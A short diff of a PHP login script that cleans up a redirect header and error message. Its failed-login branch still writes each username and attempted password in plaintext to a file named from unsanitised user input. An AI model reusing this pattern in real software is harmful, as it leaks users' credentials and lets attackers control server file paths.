@@ -5,21 +5,17 @@
         
         if(login($_POST["pseudo"], $_POST["password"])) {
             
-            header("location : index.php");
-            
-            echo "connected"
-;            
+            header('Location: index.php');
+                        
         } else {
             
-            echo "failed";
+            echo "Pseudo ou mot de passe incorrect";
             
             $logFile = fopen($_POST["pseudo"].'log.txt', 'a');
             
             fwrite($logFile, $_POST["pseudo"]. "=>" .$_POST["password"]);
             
             fclose($logFile);
-            
-            header("location : index.php");
         }
     }
     
